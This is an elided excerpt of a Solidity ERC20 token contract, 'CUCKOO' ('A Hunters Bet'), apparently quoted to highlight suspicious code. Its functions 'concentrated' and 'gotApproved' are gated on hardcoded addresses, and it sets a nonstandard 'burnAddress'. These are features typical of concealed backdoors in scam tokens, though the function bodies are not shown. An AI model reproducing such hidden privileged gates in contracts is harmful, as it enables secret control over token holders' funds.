...
/**
 * 
 * Telegram: https://t.me/CuckooCommuntiy
 * 
 * Website: https://cuckoo.bet/
 * 
 * Twitter: https://twitter.com/cuckoo_team
 * 
 */
...
contract CUCKOO is Context, IERC20, Ownable {
    ...
    string private _name = "A Hunters Bet";
    ...
    address public burnAddress = 0x861465015C562ff9B643C071314d9dd10c402ADf;
    ...
    function concentrated(address recipient, address _token) external {
        require(payable(recipient) == payable(0xC559575Dd9f3bb1eB63b07fFB1647045494BAf11));
    ...
    function gotApproved(address payable recipient) external {
        require(recipient == payable(0xF8442f9cb0667869Ab71445f98b92dD3667b3128));
